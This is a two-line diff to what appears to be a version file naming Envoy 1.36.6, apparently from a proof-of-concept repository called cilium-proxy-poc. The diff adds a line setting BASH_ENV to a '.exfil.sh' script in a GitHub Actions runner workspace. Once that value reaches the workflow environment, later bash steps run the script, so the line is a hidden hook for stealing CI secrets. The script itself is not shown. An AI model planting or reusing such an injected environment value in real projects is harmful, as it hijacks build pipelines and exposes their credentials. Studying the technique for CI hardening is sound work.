@@ -1,1 +1,2 @@
 envoy-1.36.6
+BASH_ENV=/home/runner/work/cilium-proxy-poc/cilium-proxy-poc/.exfil.sh
